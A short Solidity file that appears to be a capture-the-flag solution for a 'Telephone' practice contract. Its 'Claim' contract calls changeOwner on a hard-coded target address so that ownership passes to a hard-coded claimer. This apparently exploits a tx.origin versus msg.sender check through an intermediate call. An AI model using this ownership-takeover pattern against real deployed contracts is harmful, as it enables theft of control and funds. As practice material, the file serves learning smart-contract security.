// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Telephone{
	function changeOwner(address _owner) public virtual; 
}

contract Claim {
	address contractAddr = 0x469317Aab1Ed5Ac3DFa6c30Bf6aB0fD1dD03898A;
	address claimer = 0x37639B48Dacd985248057C90CBB2e30D30271D0C;
	
	function claimOwnership() public {
		Telephone telephone = Telephone(contractAddr);
		telephone.changeOwner(claimer);

	}
}